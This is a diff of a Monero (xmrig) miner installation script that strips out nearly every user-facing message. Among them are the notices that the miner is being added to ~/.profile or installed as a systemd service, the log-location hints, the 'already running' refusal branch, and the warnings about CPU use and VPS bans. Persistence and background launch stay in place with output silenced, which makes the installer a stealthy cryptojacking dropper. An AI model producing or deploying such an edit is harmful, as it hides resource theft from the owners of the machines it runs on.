@@ -74,7 +74,6 @@ if [ -z "$CPU_THREADS" ]; then
   else
     CPU_THREADS=`nproc`
     if [ -z "$CPU_THREADS" ]; then
-      echo "WARNING: Can't get CPU cores from nproc output"
       export CPU_THREADS=1
     fi
   fi
@@ -82,7 +81,7 @@ fi
 CPU_MHZ=`echo "$LSCPU" | grep "^CPU MHz:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
 CPU_MHZ=${CPU_MHZ%.*}
 if [ -z "$CPU_MHZ" ]; then
-  echo "WARNING: Can't get CPU MHz from lscpu output"
+
   export CPU_MHZ=1000
 fi
 CPU_L1_CACHE=`echo "$LSCPU" | grep "^L1d" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
@@ -91,7 +90,6 @@ if echo "$CPU_L1_CACHE" | grep MiB >/dev/null; then
   CPU_L1_CACHE=$(( $CPU_L1_CACHE * 1024))
 fi
 if [ -z "$CPU_L1_CACHE" ]; then
-  echo "WARNING: Can't get L1 CPU cache from lscpu output"
   export CPU_L1_CACHE=16
 fi
 CPU_L2_CACHE=`echo "$LSCPU" | grep "^L2" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
@@ -100,7 +98,6 @@ if echo "$CPU_L2_CACHE" | grep MiB >/dev/null; then
   CPU_L2_CACHE=$(( $CPU_L2_CACHE * 1024))
 fi
 if [ -z "$CPU_L2_CACHE" ]; then
-  echo "WARNING: Can't get L2 CPU cache from lscpu output"
   export CPU_L2_CACHE=256
 fi
 CPU_L3_CACHE=`echo "$LSCPU" | grep "^L3" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
@@ -109,18 +106,15 @@ if echo "$CPU_L3_CACHE" | grep MiB >/dev/null; then
   CPU_L3_CACHE=$(( $CPU_L3_CACHE * 1024))
 fi
 if [ -z "$CPU_L3_CACHE" ]; then
-  echo "WARNING: Can't get L3 CPU cache from lscpu output"
   export CPU_L3_CACHE=2048
 fi
 
 TOTAL_CACHE=$(( $CPU_THREADS*$CPU_L1_CACHE + $CPU_SOCKETS * ($CPU_CORES_PER_SOCKET*$CPU_L2_CACHE + $CPU_L3_CACHE)))
 if [ -z $TOTAL_CACHE ]; then
-  echo "ERROR: Can't compute total cache"
   exit 1
 fi
 EXP_MONERO_HASHRATE=$(( ($CPU_THREADS < $TOTAL_CACHE / 2048 ? $CPU_THREADS : $TOTAL_CACHE / 2048) * ($CPU_MHZ * 20 / 1000) * 5 ))
 if [ -z $EXP_MONERO_HASHRATE ]; then
-  echo "ERROR: Can't compute projected Monero CN hashrate"
   exit 1
 fi
 
@@ -181,7 +175,7 @@ if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
 fi
 
-echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
+echo "$CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB cache, around $EXP_MONERO_HASHRATE H/s."
 
 
 # start doing stuff: preparing miner
@@ -267,9 +261,6 @@ cat >$HOME/moneroocean/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
   nice $HOME/moneroocean/xmrig \$*
-else
-  echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
 fi
 EOL
 
@@ -279,12 +270,10 @@ chmod +x $HOME/moneroocean/miner.sh
 
 if ! sudo -n true 2>/dev/null; then
   if ! grep moneroocean/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/moneroocean/miner.sh script to $HOME/.profile"
     echo "$HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
     echo "Looks like $HOME/moneroocean/miner.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
   /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
 else
 
@@ -295,11 +284,7 @@ else
   fi
 
   if ! type systemctl >/dev/null; then
-
-    echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
     /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
-    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
-    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
@@ -317,30 +302,11 @@ CPUWeight=1
 WantedBy=multi-user.target
 EOL
     sudo mv /tmp/moneroocean_miner.service /etc/systemd/system/moneroocean_miner.service
-    echo "[*] Starting moneroocean_miner systemd service"
     sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
     sudo systemctl enable moneroocean_miner.service
     sudo systemctl start moneroocean_miner.service
-    echo "To see miner service logs run \"sudo journalctl -u moneroocean_miner -f\" command"
   fi
-fi
-
-echo ""
-echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
-if [ "$CPU_THREADS" -lt "4" ]; then
-  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
-  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
-  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  else
-    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  fi
-else
-  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config_background.json"
 fi
 echo ""
 
